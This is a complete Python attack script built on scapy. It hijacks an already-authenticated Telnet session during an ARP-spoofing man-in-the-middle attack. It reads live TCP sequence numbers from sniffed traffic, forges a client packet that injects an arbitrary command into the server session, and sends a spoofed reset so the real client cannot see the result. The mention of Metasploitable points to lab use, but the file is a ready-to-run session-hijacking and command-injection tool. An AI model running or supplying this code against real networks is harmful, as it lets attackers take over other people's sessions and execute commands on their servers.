#!/usr/bin/env python3
"""
telnet_hijack.py -- inject a command into an already-authenticated Telnet
session that we are man-in-the-middle for (via arp_spoof.py).

Prereqs:
  * MITM is up (both directions):  sudo python3 arp_spoof.py <client> <server>
  * IP forwarding is ON (arp_spoof.py enables it) so the real session stays alive.
  * The victim has already logged in over telnet to the server.

Idea:
  Every Telnet packet is cleartext and carries the live TCP seq/ack numbers.
  We forge ONE data segment that looks like it came from the client, using the
  correct seq/ack, so the server accepts and runs our command. Then we RST the
  real client so it can't send conflicting ACKs (kills the "ACK storm" and
  stops the victim seeing the injected output).
"""
from scapy.all import IP, TCP, Raw, sniff, send
import argparse


def build_args():
    p = argparse.ArgumentParser(description="Telnet TCP session hijack (command injection)")
    p.add_argument("client", help="Victim IP (the telnet client)")
    p.add_argument("server", help="Telnet server IP (e.g. Metasploitable)")
    p.add_argument("-c", "--command", default="id\n",
                   help=r"Command to inject, include trailing \n. Default: 'id\n'")
    p.add_argument("-i", "--iface", default=None, help="Interface to sniff/inject on")
    return p.parse_args()


def main():
    a = build_args()
    cmd = a.command.encode()

    def is_session(pkt):
        return (pkt.haslayer(TCP) and pkt.haslayer(IP)
                and 23 in (pkt[TCP].sport, pkt[TCP].dport)
                and {pkt[IP].src, pkt[IP].dst} == {a.client, a.server})

    print("[*] Waiting for a Telnet packet in {} <-> {} ...".format(a.client, a.server))
    pkts = sniff(iface=a.iface, lfilter=is_session, count=1, timeout=60)
    if not pkts:
        print("[-] No telnet traffic. Is the victim logged in? Is the MITM up?")
        return
    p = pkts[0]
    plen = len(p[Raw].load) if p.haslayer(Raw) else 0

    if p[IP].src == a.client:              # client -> server packet
        cport, seq, ack = p[TCP].sport, p[TCP].seq + plen, p[TCP].ack
    else:                                  # server -> client packet
        cport, seq, ack = p[TCP].dport, p[TCP].ack, p[TCP].seq + plen

    print("[*] client port {}  seq={}  ack={}".format(cport, seq, ack))
    print("[+] Injecting as the client: {!r}".format(cmd))

    # Forge the client's next data segment carrying our command.
    send(IP(src=a.client, dst=a.server) /
         TCP(sport=cport, dport=23, flags="PA", seq=seq, ack=ack) / Raw(load=cmd),
         iface=a.iface, verbose=0)

    # Silence the real client (RST spoofed from the server) to avoid an ACK storm.
    send(IP(src=a.server, dst=a.client) /
         TCP(sport=23, dport=cport, flags="R", seq=ack),
         iface=a.iface, verbose=0)

    print("[+] Done -- the server ran our command inside the victim's session.")
    print(r"[!] Prove it: -c 'id > /tmp/pwned\n'  then check /tmp/pwned on the server.")


if __name__ == "__main__":
    main()
